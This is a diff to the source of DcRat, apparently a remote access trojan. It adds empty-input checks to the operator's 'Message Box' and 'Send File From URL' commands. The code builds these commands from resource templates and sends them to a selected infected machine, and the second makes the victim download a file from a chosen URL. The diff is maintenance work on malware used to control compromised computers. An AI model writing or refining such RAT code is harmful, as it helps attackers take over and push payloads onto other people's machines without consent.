@@ -1381,7 +1381,10 @@ namespace DcRat.ChildForms
                 if (listViewHome.Tag != null)
                 {
                     var Msgbox = Interaction.InputBox("Type in the message", "Message Box", "Hello World!");
-
+                    if (string.IsNullOrEmpty(Msgbox))
+                    {
+                        return;
+                    }
                     var source = Resources.Message_Box.Replace("%qwqdanchun%", Msgbox);
                     var listViewItem = (ListViewItem) listViewHome.Tag;
                     var pack = new MsgPack();
@@ -1412,7 +1415,10 @@ namespace DcRat.ChildForms
                 {
                     var Msgbox = Interaction.InputBox("Type in the URL of the file", "File URL",
                         "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe");
-
+                    if (string.IsNullOrEmpty(Msgbox))
+                    {
+                        return;
+                    }
                     var source = Resources.Send_File_From_URL.Replace("%qwqdanchun%", Msgbox);
                     var listViewItem = (ListViewItem) listViewHome.Tag;
                     var pack = new MsgPack();
